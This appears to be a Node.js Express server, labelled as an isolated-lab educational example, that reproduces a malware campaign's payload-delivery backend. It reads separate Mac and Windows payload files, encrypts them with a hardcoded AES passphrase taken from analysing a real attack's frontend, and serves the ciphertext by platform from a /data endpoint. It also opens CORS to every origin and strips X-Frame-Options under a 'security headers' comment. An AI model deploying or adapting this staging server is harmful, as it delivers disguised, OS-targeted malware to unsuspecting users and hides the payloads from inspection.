// ===== EDUCATIONAL LAB EXAMPLE ONLY =====
// Use in isolated VM, no internet connection, documented authorization required

const express = require('express');
const cors = require("cors");
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = 3000;  // Configurable port

// Encryption keys (from frontend analysis)
const PASSPHRASE = "98yNCjeAfWMwk0wI";

function encryptWithAES(content, passphrase) {
  const algo = 'aes-256-cbc';
  const key = Buffer.from(passphrase.padEnd(32, '\0'));
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algo, key, iv);
  
  let encrypted = cipher.update(content, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  
  return encrypted;
}

// Load payloads from local files
const payloadMac = fs.readFileSync(path.join(__dirname, 'payload-mac.html'), 'utf8');
const payloadWin = fs.readFileSync(path.join(__dirname, 'payload-win.html'), 'utf8');

// Pre-encrypt both payloads
const encryptedMac = encryptWithAES(payloadMac, PASSPHRASE);
const encryptedWin = encryptWithAES(payloadWin, PASSPHRASE);

// Logging middleware (for defensive monitoring training)
app.use(cors());
app.use(express.json());

// Optimized Security Headers Middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
    }
    next();
});

app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} - IP: ${req.ip}`);
  next();
});

// Endpoint matching the analyzed attack pattern
app.get('/data', (req, res) => {
  const platform = req.query.platform || 'win';
  const cipher = platform === 'mac' ? encryptedMac : encryptedWin;
  res.json({ cipher });
});

// Start server on configured port
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
